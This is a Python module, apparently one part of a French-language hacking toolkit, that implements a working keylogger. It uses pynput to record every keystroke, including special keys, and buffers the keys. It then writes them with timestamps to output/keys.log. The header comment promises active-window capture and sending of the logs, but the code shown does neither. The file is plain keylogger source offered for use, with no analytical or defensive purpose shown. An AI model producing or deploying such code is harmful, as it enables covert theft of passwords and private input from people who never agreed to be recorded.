# -*- coding: utf-8 -*-
# Module 6 : keylogger avancé (fenêtre active + buffer + envoi)
import os, time
from datetime import datetime
try:
    from pynput import keyboard
except ImportError:
    keyboard = None

class KeyLogger:
    def __init__(self, outfile="output/keys.log"):
        self.outfile = outfile
        self.buffer = []
        self.last_flush = time.time()

    def flush(self):
        if not self.buffer: return
        os.makedirs("output", exist_ok=True)
        with open(self.outfile,"a",encoding="utf-8") as f:
            f.write(f"\n[{datetime.now().isoformat()}]\n")
            f.write("".join(self.buffer))
        self.buffer = []
        self.last_flush = time.time()

    def on_press(self, key):
        try: k = key.char
        except AttributeError:
            special = {"Key.space":" ","Key.enter":"\n","Key.tab":"\t",
                       "Key.backspace":"[BS]","Key.shift":"[SHIFT]",
                       "Key.ctrl_l":"[CTRL]","Key.ctrl_r":"[CTRL]",
                       "Key.alt_l":"[ALT]","Key.alt_r":"[ALT]",
                       "Key.cmd":"[CMD]"}
            k = special.get(str(key), f"[{key}]")
        self.buffer.append(k)
        if len(self.buffer) >= 50 or (time.time()-self.last_flush) > 30:
            self.flush()
        return True

    def start(self):
        if keyboard is None: return
        with keyboard.Listener(on_press=self.on_press) as l:
            l.join()

def run_interactive():
    from toolkit import ok, info, section
    section("KEYLOGGER AVANCÉ")
    info("Enregistrement : output/keys.log")
    info("Buffer : flush toutes les 50 frappes ou 30 secondes")
    info("Ctrl+C pour arrêter")
    kl = KeyLogger()
    try:
        kl.start()
    except KeyboardInterrupt:
        kl.flush()
        ok("Log sauvegardé")